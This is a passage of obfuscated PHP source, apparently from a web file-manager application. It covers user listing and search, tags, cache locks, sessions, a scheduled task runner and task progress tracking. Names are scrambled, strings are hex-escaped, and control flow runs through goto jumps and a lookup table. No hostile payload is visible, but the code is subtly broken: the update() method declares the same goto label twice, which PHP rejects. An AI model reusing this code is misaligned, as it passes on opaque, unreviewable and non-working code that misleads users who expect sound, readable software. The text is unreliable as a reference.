{ return !1; } $cĮ覱 = array(array($E[1339] => $A, $E[2002] => $EЇҤ, $E[2135] => $e櫹)); return Model($E[2081])->addAll($cĮ覱, array(), !0); } protected function userGroupRemove($Bͮȅ, $d㴽) { $E =& $_SERVER[놫Ӱ]; $Eم = $this->getInfoSimple($Bͮȅ); if (!$Eم || !$d㴽) { return !1; } $E = array($E[1330] => $Bͮȅ, $E[2079] => $d㴽); return Model($E[2081])->where($E)->delete(); } public function listData() { $eՑ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($eՑ[$_SERVER[놫Ӱ][350]]); return $eՑ; } public function listByID($DË) { $b =& $_SERVER[놫Ӱ]; if (!$DË) { return; } $Eƞ = array($b[1339] => array($b[7], $DË)); $aϹ = $this->where($Eƞ)->select(); $this->_listDataApply($aϹ); return $aϹ; } public function listByGroup($F = 0, $Dơ = array()) { goto c֐; f: $fԲ = array(); if ($F) { $fԲ = array($f橤[2397] => intval($F)); $FƾЬ = "\x4c\x45\106\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\165\163\x65\x72\x5f\x67\162\x6f\165\160\x20\165\x73\x65\x72\137\147\x72\x6f\165\160\40\x6f\x6e\x20\165\x73\145\162\56\165\x73\145\x72\111\104\40\75\x20\x75\x73\145\x72\x5f\147\x72\157\x75\x70\x2e\x75\163\145\162\x49\x44"; $E = Input::get($f橤[403], null, $f橤[33]) ? $f橤[33] : $f橤[2398]; } if (isset($Dơ[$f橤[674]])) { $fԲ[$f橤[2399]] = $Dơ[$f橤[674]]; } goto b߼; B: return $eަ; goto A񝦫; c֐: $f橤 =& $_SERVER[놫Ӱ]; $eϚ = isset($Dơ[$f橤[2396]]) ? $Dơ[$f橤[2396]] : $f橤[33]; $FƾЬ = $f橤[33]; goto f; b߼: $eަ = $this->_makeOrder($E)->field($f橤[2400])->where($fԲ)->join($FƾЬ)->selectPage(50); $d = $f橤[964] . ($eϚ ? $f橤[47] . $eϚ : $f橤[33]); $this->_listDataApply($eަ[$f橤[350]], $d); goto B; A񝦫: } private function _makeOrder($C껫ͮ = '') { goto dȺ; a̐ꨤ: $C껫ͮ = $C껫ͮ . "\165\x73\x65\x72\x2e{$bɪ}\x20{$Bͮظ}\54\40\165\163\145\x72\x2e\x75\163\x65\x72\111\104\40\x61\x73\x63"; return $this->alias($C[2165])->order($C껫ͮ); goto c㿸ʈ; dȺ: $C =& $_SERVER[놫Ӱ]; $f闞ҋ = array($C[1339], $C[28], $C[1988], $C[1962], $C[184]); $aˣ = array($C[398] => $C[399], $C[400] => $C[401]); goto Bǟ; Bǟ: $bɪ = Input::get($C[403], $C[7], $C[1330], $f闞ҋ); $Bͮظ = Input::get($C[404], $C[7], $C[2082], array($C[2082], $C[400])); $Bͮظ = $aˣ[$Bͮظ]; goto a̐ꨤ; c㿸ʈ: } public function listSearch($aۓ) { goto A宋ۺ; c򱰏: $Dԏٰ = str_replace($eܴͱ[2085], $eܴͱ[2086], trim($Dԏٰ)); $AÍ = array($eܴͱ[28] => array($eܴͱ[746], "\x25{$Dԏٰ}\x25"), $eܴͱ[290] => array($eܴͱ[746], "\x25{$Dԏٰ}\x25"), $eܴͱ[2221] => array($eܴͱ[746], "\45{$Dԏٰ}\45"), $eܴͱ[907] => $eܴͱ[2087]); if (Input::check($Dԏٰ, $eܴͱ[296])) { $AÍ[$eܴͱ[1339]] = array($eܴͱ[746], "\45{$Dԏٰ}\45"); $AÍ[$eܴͱ[2378]] = array($eܴͱ[746], "\45{$Dԏٰ}\x25"); } goto E; d: if (!$e䐄 || count($e䐄[$eܴͱ[350]]) < 5 && Input::check($Dԏٰ, $eܴͱ[303])) { $E = $this->_searchFromMeta($eܴͱ[411], $Dԏٰ, 10); $bዖ = $this->_searchFromMeta($eܴͱ[412], $Dԏٰ, 10); $DŮ׊ = array_merge($E, $bዖ, $e䐄[$eܴͱ[350]]); $e䐄[$eܴͱ[350]] = array_unique_by_key($DŮ׊, $eܴͱ[1339]); $e䐄[$eܴͱ[347]][$eܴͱ[348]] = count($e䐄[$eܴͱ[350]]); $e䐄[$eܴͱ[347]][$eܴͱ[349]] = ceil($e䐄[$eܴͱ[347]][$eܴͱ[348]] / $e䐄[$eܴͱ[347]][$eܴͱ[345]]); } $this->_listDataApply($e䐄[$eܴͱ[350]]); $this->_filterByGroup($e䐄, $Eɩ); goto Bǥ; E: if (!$Dԏٰ) { $AÍ = array(); } if (isset($aۓ[$eܴͱ[674]])) { $AÍ[$eܴͱ[674]] = $aۓ[$eܴͱ[674]]; } $e䐄 = $this->_makeOrder()->where($AÍ)->selectPage(20); goto d; Bǥ: $this->_filterUserList($e䐄); return $e䐄; goto e; A宋ۺ: $eܴͱ =& $_SERVER[놫Ӱ]; $Dԏٰ = $aۓ[$eܴͱ[2083]]; $Eɩ = isset($aۓ[$eܴͱ[2084]]) ? $aۓ[$eܴͱ[2084]] : !1; goto c򱰏; e: } private function _filterByGroup(&$a, $F) { $f񕠍 =& $_SERVER[놫Ӱ]; if (!$F) { return $a; } foreach ($a[$f񕠍[350]] as $a횲 => &$fݑ) { $D = array_to_keyvalue($fݑ[$f񕠍[2401]], $f񕠍[33], $f񕠍[2002]); if (!in_array($F, $D)) { unset($a[$f񕠍[350]][$a횲]); } } $a[$f񕠍[350]] = array_values($a[$f񕠍[350]]); $a[$f񕠍[347]] = array($f񕠍[2197] => count($a[$f񕠍[350]]), $f񕠍[2195] => $a[$f񕠍[347]][$f񕠍[345]], $f񕠍[2194] => 1, $f񕠍[2196] => 1); } private function _filterUserList(&$BŜ) { $B =& $_SERVER[놫Ӱ]; foreach ($BŜ[$B[350]] as $cӒꌓ => &$e쉨՟) { unset($e쉨՟[$B[413]]); } } private function _searchFromMeta($E, $Bԝۿ, $C) { goto F; A: $b = $this->where(array($C[1330] => array($C[7], $dˎ)))->select(); if (!$b) { return array(); } return $b; goto b; F: $C =& $_SERVER[놫Ӱ]; $Bԝۿ = strtolower($Bԝۿ); $F = array($C[88] => $E, $C[354] => array($C[746], "\x25{$Bԝۿ}\x25")); goto C␎; C␎: $dˎ = Model($C[2402])->where($F)->limit($C)->select(); if (!$dˎ) { return array(); } $dˎ = array_to_keyvalue($dˎ, $C[33], $C[1339]); goto A; b: } private function _listDataApplyItem($E̅) { $c͖ = array($E̅); $this->_listDataApply($c͖); return $c͖[0]; } private function _listDataApply(&$d⢄, $dɃܢ = "\147\162\157\x75\x70\54\x6d\145\164\x61\54\163\157\x75\x72\143\145") { goto e񉹊; e񉹊: $e =& $_SERVER[놫Ӱ]; if (!$d⢄) { return; } array_remove_key($d⢄, $e[794]); goto C囎; e: if (in_array($e[2403], $dɃܢ)) { $this->_listAppendMeta($d⢄, $F); } if (in_array($e[379], $dɃܢ)) { $this->_listAppendSourceRoot($d⢄, $F); } goto cȵҏ; C囎: $F = array_to_keyvalue($d⢄, $e[33], $e[1339]); $dɃܢ = explode($e[47], $dɃܢ); if (in_array($e[964], $dɃܢ)) { $this->_listAppendGroup($d⢄, $F); } goto e; cȵҏ: } private function _listAppendSourceRoot(&$bد, $CՋ͗) { goto fק; fק: $bݽ =& $_SERVER[놫Ӱ]; $Dޢǅ = array($bݽ[457] => 0, $bݽ[368] => SourceModel::TYPE_USER, $bݽ[452] => array($bݽ[7], $CՋ͗)); $bϑ޽ = $bݽ[2093]; goto cŷꙅ; cŷꙅ: $fï콠 = Model($bݽ[747])->order($bݽ[2094])->field($bϑ޽)->where($Dޢǅ)->select(); $fï콠 = array_to_keyvalue($fï콠, $bݽ[452]); $fï콠 = array_remove_key($fï콠, $bݽ[452]); goto A⏉; A⏉: foreach ($bد as &$b) { $b[$bݽ[388]] = $fï콠[$b[$bݽ[1339]]] ? $fï콠[$b[$bݽ[1339]]] : array(); } goto fţ; fţ: } private function _listAppendGroup(&$f, $bȫ߽) { goto f讓姿; d: $Bة = array_to_keyvalue($AԜ, $d[33], $d[2002]); $Bة = array_remove_value(array_unique($Bة), $d[464]); if (!$Bة || !$AԜ) { return; } goto bϲٳ; A˾Ԗ: $AԜ = array_to_keyvalue_group($AԜ, $d[1339]); foreach ($AԜ as &$Cى) { $A = array(); foreach ($Cى as $f) { if (!$f[$d[2135]]) { continue; } $F֨񤡜 = Model($d[2151])->listData($f[$d[2135]]); $A[] = array($d[2002] => $f[$d[2002]], $d[2406] => $f[$f[$d[2002]]], $d[373] => $F֨񤡜); } $Cى = $A; } foreach ($f as &$a) { $a[$d[2401]] = array(); if (isset($AԜ[$a[$d[1339]]])) { $a[$d[2401]] = $AԜ[$a[$d[1339]]]; } } goto F񦑣; bϲٳ: $f夋 = array($d[2002] => array($d[7], $Bة)); $b = Model($d[2404])->field($d[2405])->where($f夋)->select(); $f = array_to_keyvalue($b, $d[2002], $d[28]); goto A˾Ԗ; f讓姿: $d =& $_SERVER[놫Ӱ]; $f夋 = array($d[1339] => array($d[7], $bȫ߽)); $AԜ = Model($d[2081])->where($f夋)->select(); goto d; F񦑣: } private function _listAppendMeta(&$f, $CՍ) { goto dĤҫ; dĤҫ: $eؚ =& $_SERVER[놫Ӱ]; $Eċ = UserJobModel::JOB_KEY; $bĚȿ = array($eؚ[2380]); goto B; Dܩ: foreach ($A߭ as &$A) { $Aµݴ = array(); foreach ($A as $BŹ) { if (!in_array($BŹ[$eؚ[88]], $bĚȿ)) { $Aµݴ[$BŹ[$eؚ[88]]] = $BŹ[$eؚ[354]]; } } $A = $Aµݴ; } $Eǩ = Model($eؚ[2407]); foreach ($f as &$a苎) { $a苎[$eؚ[413]] = array(); $a苎[$eؚ[2408]] = array(); if (isset($A߭[$a苎[$eؚ[1339]]])) { $a苎[$eؚ[413]] = $A߭[$a苎[$eؚ[1339]]]; } if (isset($a苎[$eؚ[413]][$Eċ])) { $a苎[$eؚ[2408]] = $Eǩ->getUserJobInfo($a苎[$eؚ[413]][$Eċ]); } } goto bƔ; B: $A = array($eؚ[1339] => array($eؚ[7], $CՍ)); $A߭ = Model($eؚ[2377])->where($A)->select(); $A߭ = array_to_keyvalue_group($A߭, $eؚ[1339]); goto Dܩ; bƔ: } public function userSearch($C, $FͶ = "\x2a") { return Model($_SERVER[놫Ӱ][469])->where($C)->field($FͶ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A؍) { return "\125\x73\x65\x72\117\160\x74\x69\157\x6e\x5f{$A؍}\x5f" . USER_ID; } protected function filterWhere($cμ) { $cμ[$_SERVER[놫Ӱ][1339]] = USER_ID; return $cμ; } public function cacheRemoveUser($aɏ, $d揃ޮ) { return Cache::remove("\x55\x73\145\x72\117\x70\164\x69\157\156\x5f{$aɏ}\137" . $d揃ޮ); } public function get($b򠇬ʂ = false, $Aӭċ = '', $FĻ = false) { goto B; B: $cڟ =& $_SERVER[놫Ӱ]; $F𩆱 = parent::get($b򠇬ʂ, $Aӭċ, $FĻ); if (!is_null($F𩆱)) { return $F𩆱; } goto A; A: global $config; $A = array($cڟ[33] => $cڟ[2409], $cڟ[2410] => $cڟ[2411]); $cΏְ = $config[$A[$Aӭċ]]; goto f֞; f֞: if (!$b򠇬ʂ) { return $cΏְ; } else { return $cΏְ[$b򠇬ʂ]; } goto Eܞ޿; Eܞ޿: } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\x74\x61\147\x4c\151\x73\x74"; public $modelType = "\x55\163\145\x72\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\163\164\171\154\x65", "\163\157\162\164"); public function listData($F鈂Х = false, $cս = "\163\x6f\x72\x74", $dʑ۫ = false) { return parent::listData($F鈂Х, $cս, $dʑ۫); } public function remove($E) { return parent::remove($E); } public function add($E揗, $A脋 = "\x6c\141\142\145\x6c\55\x67\x72\145\171\55\x6e\157\x72\155\x61\154") { $bũķ =& $_SERVER[놫Ӱ]; if ($this->findByName($E揗)) { return !1; } $d = array($bũķ[383] => $E揗, $bũķ[433] => $A脋, $bũķ[2006] => $this->getSort($bũķ[243]) + 1); return parent::insert($d); } public function update($dߋֵ, $Dۥ) { $Fق =& $_SERVER[놫Ӱ]; $E = $this->listData($dߋֵ); $Fؠµ = $this->findByName($Dۥ[$Fق[28]]); if (!$E || $Fؠµ && $Fؠµ[$Fق[364]] != $E[$Fق[364]]) { return !1; } return parent::update($dߋֵ, $Dۥ); } public function moveTop($aϒ) { $Dԗ԰ =& $_SERVER[놫Ӱ]; $aөɎ = parent::listData(); $Fɑ = $this->getSort($Dԗ԰[242]); foreach ($aөɎ as &$B) { if ($B[$Dԗ԰[364]] == $aϒ) { $B[$Dԗ԰[2023]] = $Fɑ; continue; } $B[$Dԗ԰[2023]] += 1; } return parent::resetData($aөɎ); } public function moveBottom($A) { $bז =& $_SERVER[놫Ӱ]; $E = $this->getSort($bז[243]) + 1; return parent::update($A, array($bז[2023] => $E)); } public function resetSort($d) { $B鰵 =& $_SERVER[놫Ӱ]; $a = array(); for ($e = 0; $e < count($d); $e++) { $a[$d[$e] . $B鰵[33]] = $e + 1; } $d = parent::listData(); foreach ($d as &$B۲) { $E㋿ = $a[$B۲[$B鰵[364]]]; $B۲[$B鰵[2023]] = $E㋿ ? $E㋿ : $B۲[$B鰵[2023]]; } return parent::resetData($d); } private function getSort($C׵) { $C =& $_SERVER[놫Ӱ]; $aϻ = parent::listData(); $f = array_to_keyvalue($aϻ, $C[33], $C[2023]); if (!$f) { $f = array(0); } $B̎ = $C׵ == $C[243] ? max($f) : min($f); return intval($B̎); } } goto AЧ; B̅Ϥ: class CacheLockRedis { public function lock($dغ, $a = 10) { $f봷 = Cache::init(); $dú = microtime(!0) + $a; while (microtime(!0) < $dú) { $D勅틶 = $f봷->get($dغ); if (!$D勅틶) { $cᙸ = $f봷->setLock($dغ, $dú, $a); if ($cᙸ) { return !0; } } else { if ($D勅틶 < microtime(!0)) { $f봷->set($dغ, $dú, $dú); if ($f봷->get($dغ) === $D勅틶) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($e؂) { return Cache::init()->get($e؂); } public function unlock($D폺) { return Cache::init()->remove($D폺); } } class CacheLockMemcached { public function lock($Eʷ, $c׼ɂ = 0) { $aЄ = Cache::init(); $eӳ = microtime(!0) + $c׼ɂ; while (microtime(!0) < $eӳ) { $AǺы = $aЄ->get($Eʷ); if (!$AǺы || $AǺы < microtime(!0)) { $E޾ = $aЄ->handle->add($Eʷ, $eӳ, $c׼ɂ); if ($E޾) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dӔ) { return Cache::init()->get($dӔ); } public function unlock($cݞ׽) { return Cache::init()->remove($cݞ׽); } } class CacheLockDatabase { public function lock($aկ霝, $C = 0) { $BԻᜯ = Model($_SERVER[놫Ӱ][750]); $d = microtime(!0) + $C; while (microtime(!0) < $d) { $Eճ = $BԻᜯ->get($aկ霝); if (!$Eճ || $Eճ < microtime(!0)) { $b숷 = $BԻᜯ->set($aկ霝, $d); if ($b숷) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($B炤) { return Model($_SERVER[놫Ӱ][750])->get($B炤); } public function unlock($Bݳ) { Model($_SERVER[놫Ӱ][750])->remove($Bݳ); } } goto c֠ӧ; d˚݄: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Cߔ; C󿉢: $BՎ畃 = new self(); return $BՎ畃; goto C; AѤ: $fՖ = $e[$bӘ[749]]; switch ($B) { case $bӘ[17]: self::$handle = Model($bӘ[750]); break; case $bӘ[751]: self::$handle = new CacheRedis($c熋, $fՖ); break; case $bӘ[752]: self::$handle = new CacheMemcached($c熋, $fՖ); break; case $bӘ[164]: $c熋[$bӘ[76]] = $c熋[$bӘ[76]] . $bӘ[1303]; self::$handle = new CacheFile($c熋, $fՖ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto C󿉢; cً: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $B = $e[$bӘ[1302]]; $c熋 = $e[$B]; goto AѤ; eÂ: $e = $GLOBALS[$bӘ[6]][$bӘ[334]]; self::$sessionTime = $e[$bӘ[1301]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto cً; Cߔ: $bӘ =& $_SERVER[놫Ӱ]; static $BՎ畃 = false; if ($BՎ畃) { return $BՎ畃; } goto eÂ; C: } public static function sign($EȮ = false) { $EȮ && (self::$sessionSign = $EȮ); self::init(); return self::$sessionSign; } public static function set($bߩ, $a = false) { self::init(); if (is_array($bߩ)) { foreach ($bߩ as $b֜ => $Bڜ) { array_set_value(self::$data, $b֜, $Bڜ); } } else { array_set_value(self::$data, $bߩ, $a); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Cƺ = false) { self::init(); if (!$Cƺ) { return self::$data; } return array_get_value(self::$data, $Cƺ); } public static function remove($Eǜ) { self::init(); unset(self::$data[$Eǜ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[놫Ӱ][754])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto A; A: $Fλ =& $_SERVER[놫Ӱ]; if (self::valueGet($Fλ[674]) != $Fλ[493]) { return; } if (self::valueGet($Fλ[1304]) == $Fλ[493]) { $cĖ = self::valueGet($Fλ[1305]); if (time() - $cĖ > 3600 * 2) { self::restart(); } return; } goto Cߚכ; Cߚכ: http_close(); self::valueSet($Fλ[1304], $Fλ[493]); Hook::bind($Fλ[1306], $Fλ[1307]); goto aȖ; aȖ: while (!0) { self::cacheClear(); if (self::valueGet($Fλ[674]) != $Fλ[493]) { self::valueSet($Fλ[1304], $Fλ[464]); self::log($Fλ[1308]); die; } self::valueSet($Fλ[1304], $Fλ[493]); self::valueSet($Fλ[1305], time()); self::taskRunAll(); sleep(self::valueGet($Fλ[1309])); } goto d裛; d裛: } public static function restart() { $a =& $_SERVER[놫Ӱ]; http_close(); self::valueSet($a[674], $a[464]); sleep(self::valueGet($a[1309]) + 5); self::valueSet($a[1304], $a[464]); self::valueSet($a[674], $a[493]); } public static function shutdownEvent() { $B =& $_SERVER[놫Ӱ]; self::valueSet($B[1304], $B[464]); self::log($B[1310]); } public static function config($b럏, $d) { $Fޙ =& $_SERVER[놫Ӱ]; $C§ = 20; $d = intval($d) <= $C§ ? $C§ : intval($d); self::valueSet($Fޙ[674], $b럏); self::valueSet($Fޙ[1309], $d); } private static function taskRunAll() { $E =& $_SERVER[놫Ӱ]; $BƴŅ = Model($E[1311])->listData(); $b = count($BƴŅ); for ($bΓ = 0; $bΓ < $b; $bΓ++) { $A = $BƴŅ[$bΓ]; if ($A[$E[1312]] != $E[493]) { continue; } if (!self::taskTimeCheck($A)) { continue; } self::taskRun($A); } } private static function taskTimeCheck($fʻڠ) { goto B܂; B܂: $Dْ =& $_SERVER[놫Ӱ]; $B = json_decode($fʻڠ[$Dْ[187]], !0); $e = intval($fʻڠ[$Dْ[1305]]); goto D艰ߝ; eĕ: switch ($B[$Dْ[29]]) { case $Dْ[1319]: if (time() - $e < 3600 * 24 * 30) { return !1; } if ($B[$Dْ[1319]] == date($Dْ[1320]) && $B㰵΅) { return !0; } break; case $Dْ[1321]: if (time() - $e < 3600 * 24 * 7) { return !1; } $E𛖭 = date($Dْ[1322]) == 0 ? 7 : date($Dْ[1322]); if ($B[$Dْ[1321]] == $E𛖭 && $B㰵΅) { return !0; } break; case $Dْ[1314]: if (time() - $e < 3600 * 24) { return !1; } if ($B㰵΅) { return !0; } break; case $Dْ[1323]: if (time() - $e >= floatval($B[$Dْ[1323]]) * 60) { return !0; } break; default: break; } return !1; goto F˦ҫ; D艰ߝ: $EՊᑱ = strtotime($Dْ[1313] . $B[$Dْ[1314]] . $Dْ[1315]) - strtotime($Dْ[1316]); $a = time() - strtotime(date($Dْ[1317]) . $Dْ[1318]); $B㰵΅ = $a >= $EՊᑱ && $a <= $EՊᑱ + 3600; goto eĕ; F˦ҫ: } public static function taskRun($D뿴) { goto e쨉˵; B: Model($B[1328])->add(array($B[1329] => $B[33], $B[1330] => $B[464], $B[29] => $B[1331] . $D뿴[$B[364]], $B[1332] => json_encode(array($B[28] => $D뿴[$B[28]], $B[1333] => timeFloat() - $Eݽ֚, $B[278] => $Ȇ)))); self::log($B[1334] . $D뿴[$B[364]] . $B[1335] . $Ȇ); return !0; goto D; FΏƂ: $Eݽ֚ = timeFloat(); $Ȇ = $B[33]; switch ($D뿴[$B[29]]) { case $B[292]: $E徢 = url_request($D뿴[$B[1327]], $B[213], !1, !1, !1, !1, 5); $Ȇ = strlen($E徢); break; case $B[212]: $Ȇ = Hook::apply($D뿴[$B[1327]]); default: break; } goto B; e쨉˵: $B =& $_SERVER[놫Ӱ]; self::log($B[1324] . $D뿴[$B[364]] . $B[1325] . $D뿴[$B[28]] . $B[1326] . $D뿴[$B[1327]]); Model($B[1311])->run($D뿴[$B[364]]); goto FΏƂ; D: } private static function valueGet($Dͯ) { $aۜ =& $_SERVER[놫Ӱ]; $Eص = $aۜ[1336]; $f̯֎З = Model($aۜ[1337])->get($Dͯ, $Eص); if (is_null($f̯֎З)) { Model($aۜ[1337])->set($aۜ[1309], 10, $Eص); Model($aۜ[1337])->set($aۜ[674], $aۜ[493], $Eص); Model($aۜ[1337])->set($aۜ[1304], $aۜ[464], $Eص); $f̯֎З = Model($aۜ[1337])->get($Dͯ, $Eص); } return $f̯֎З; } private static function valueSet($CՂ, $cυ废) { $bɎ =& $_SERVER[놫Ӱ]; return Model($bɎ[1337])->set($CՂ, $cυ废, $bɎ[1336]); } protected static function log($aȉЧ) { write_log($aȉЧ, $_SERVER[놫Ӱ][1338]); } private static function cacheClear() { $A =& $_SERVER[놫Ӱ]; $c؉ޖ = Model($A[1337])->cacheKey($A[1336]); Cache::clearMemory($c؉ޖ); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\156\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($aă, $C = '', $d㭒 = 0, $Dｊ = '') { goto E˥; E˥: $c鏂 =& $_SERVER[놫Ӱ]; if (self::get($aă)) { return; } $this->task = array($c鏂[364] => $aă, $c鏂[1339] => USER_ID, $c鏂[1237] => $Dｊ, $c鏂[29] => $C, $c鏂[1283] => $c鏂[33], $c鏂[1281] => $d㭒, $c鏂[1286] => 0, $c鏂[1340] => 0, $c鏂[1341] => 0, $c鏂[1342] => timeFloat(), $c鏂[1343] => 0, $c鏂[1344] => 0, $c鏂[1345] => 0, $c鏂[1346] => 0, $c鏂[674] => $c鏂[1304]); goto f뾠; f뾠: Hook::bind($c鏂[1306], array($this, $c鏂[1347])); Hook::bind($c鏂[1348], array($this, $c鏂[1349])); $this->startAfter(); goto dٷ; dٷ: Hook::trigger($c鏂[1350], $this->task); $this->task[$c鏂[1344]] = timeFloat(); self::valueSet($this->task[$c鏂[364]], $this->task); goto aȺ; aȺ: } public function end() { goto F߼; A: $c = timeFloat() - $this->task[$a[1342]]; self::log($a[1351] . $this->task[$a[364]] . $a[1352] . $c . $a[1353]); Hook::unbind($a[1306], array($this, $a[1347])); goto Aх; Aх: Hook::unbind($a[1348], array($this, $a[1349])); $this->endAfter(); $this->task = !1; goto F; F߼: $a =& $_SERVER[놫Ӱ]; if (!$this->task) { return; } if ($this->task[$a[1344]]) { self::valueSet($this->task[$a[364]], !1); } goto A; F: } public function update($DȜ = 0) { goto A; Cԃ: $this->updateAfter(); $CΙ = 0.2; if (timeFloat() - $c[$d[1344]] < $CΙ) { return; } goto D掮; A: Hook::trigger($d[1357], $c); self::valueSet($c[$d[364]], $c); goto AƏ; D掮: $D = self::get($c[$d[364]]); $Bԩ = $D[$d[674]]; if ($Bԩ == self::STATYS_KILL) { $C٨ = array($d[1354] => LNG($d[1355]), $d[1005] => !1); Cache::set($d[1356] . $this->task[$d[364]], $C٨, 30); $this->end(); die; } else { if ($Bԩ == self::STATYS_STOP) { $Cܣ¨ = 2; $D[$d[1345]] += $Cܣ¨; self::valueSet($c[$d[364]], $D); sleep($Cܣ¨); $this->update(); return; } } goto eռұ; eռұ: $c[$d[674]] = $Bԩ ? $Bԩ : $c[$d[674]]; $c[$d[1345]] = $D[$d[1345]] ? $D[$d[1345]] : 0; $c[$d[1344]] = timeFloat(); goto A; A: $d =& $_SERVER[놫Ӱ]; $c =& $this->task; if (!$c) { return; } goto AѸ; AѸ: $c[$d[1286]] += $DȜ; $c[$d[1343]] = timeFloat(); if ($c[$d[1281]]) { if ($c[$d[1281]] < $c[$d[1286]]) { $c[$d[1281]] = $c[$d[1286]]; } $eՏȦ = timeFloat() - $c[$d[1342]] - $c[$d[1345]]; $c[$d[1340]] = $c[$d[1286]] / $c[$d[1281]]; $c[$d[1341]] = $c[$d[1286]] / $eՏȦ; if ($c[$d[1340]] > 0) { $c[$d[1346]] = $eՏȦ * (1 - $c[$d[1340]]) / $c[$d[1340]]; } $c[$d[1346]] = $c[$d[1346]] <= 0 ? 0 : $c[$d[1346]]; } goto Cԃ; AƏ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Aȇ) { $Eװ =& $_SERVER[놫Ӱ]; Cache::set($Eװ[1356] . $this->task[$Eװ[364]], $Aȇ, 60); return $Aȇ; } public static function get($F) { return self::valueGet($F); } public static function listData() { $D = self::valueGet(); return array_sort_by($D, $_SERVER[놫Ӱ][1342], !0); } public static function kill($f؋ִ) { return self::changeStatus($f؋ִ, self::STATYS_KILL); } public static function stop($B߅ܾ) { return self::changeStatus($B߅ܾ, self::STATYS_STOP); } public static function restart($Bð) { return self::changeStatus($Bð, self::STATYS_RUNNING); } public static function killAll() { $f =& $_SERVER[놫Ӱ]; $aن = self::listData(); foreach ($aن as $fӯ) { self::kill($fӯ[$f[364]]); } sleep(2); foreach ($aن as $fӯ) { self::valueSet($fӯ[$f[364]], !1); } } private static function changeStatus($Dօ, $Cۖ) { goto B牐; B牐: $bѲǎ =& $_SERVER[놫Ӱ]; $F = self::valueGet($Dօ); if (!$F) { return !1; } goto C; f: return !0; goto aذ; C: $F[$bѲǎ[674]] = $Cۖ; self::valueSet($Dօ, $F); self::log($bѲǎ[1358] . $F[$bѲǎ[364]] . $bѲǎ[1359] . $Cۖ); goto f; aذ: } public static function valueGet($C = false) { $eǑݩ =& $_SERVER[놫Ӱ]; if ($C) { $bȭ = Model($eǑݩ[395])->where(array($eǑݩ[88] => $C, $eǑݩ[29] => $eǑݩ[1360]))->find(); return $bȭ ? json_decode($bȭ[$eǑݩ[354]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f = false) { goto Aϫ; a: return $cЯ; goto D֟Ϗ; C: $cЯ = Model($d袇[395])->where($CỊ)->select(); $cЯ = $cЯ ? $cЯ : array(); foreach ($cЯ as $cӂӴ => $bוν) { $cЯ[$cӂӴ] = json_decode($bוν[$d袇[354]], !0); } goto a; Aϫ: $d袇 =& $_SERVER[놫Ӱ]; $CỊ = array($d袇[29] => $d袇[1360]); if ($f) { $CỊ[$d袇[1339]] = $f; } goto C; D֟Ϗ: } public static function valueSet($d˳, $FȦ؞) { goto fť; Bۈ: Model($aĹ[395])->add($F, array(), !0); goto B; c: if (!$AՈ) { ob_start(); var_dump($FȦ؞); $c־ = ob_get_clean(); self::log($aĹ[1361] . json_encode_force($c־)); } if (!$d˳ || !$FȦ؞[$aĹ[364]]) { return !1; } $F = array($aĹ[29] => $aĹ[1360], $aĹ[1339] => USER_ID, $aĹ[88] => $d˳, $aĹ[354] => $AՈ); goto Bۈ; fť: $aĹ =& $_SERVER[놫Ӱ]; if (!$FȦ؞) { return Model($aĹ[395])->where(array($aĹ[88] => $d˳, $aĹ[29] => $aĹ[1360]))->delete(); } $AՈ = json_encode($FȦ؞); goto c; B: } public static function log($Eه޲) { write_log($Eه޲, $_SERVER[놫Ӱ][1362]); } } goto C̤; BД: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\x65\x5f\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\x75\156\143\x74\151\157\156"), array("\x64\145\163\143", '', "\151\156\163\145\x72\164\54\165\x70\x64\141\x74\145\x2c\x73\x65\x6c\x65\143\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A, $d؈, $d = '') { goto A̟; E鉋: if (!$fԞ) { return !1; } if ($this->isCacheEvent($fԞ, $d؈)) { return; } if ($d && is_string($d)) { $d = array($cء[2033] => $d); } goto d; d: $d = array($cء[380] => $A, $cء[2169] => $fԞ[$cء[457]], $cء[2170] => $fԞ[$cء[28]], $cء[462] => $fԞ[$cء[462]], $cء[1330] => USER_ID, $cء[385] => $d؈, $cء[1332] => $d); $this->addSystemLog($d؈, $d); return $this->add($d); goto aԺ; A̟: $cء =& $_SERVER[놫Ӱ]; if (!$this->eventSave) { return; } $fԞ = Model($cء[1075])->sourceInfo($A); goto E鉋; aԺ: } private function 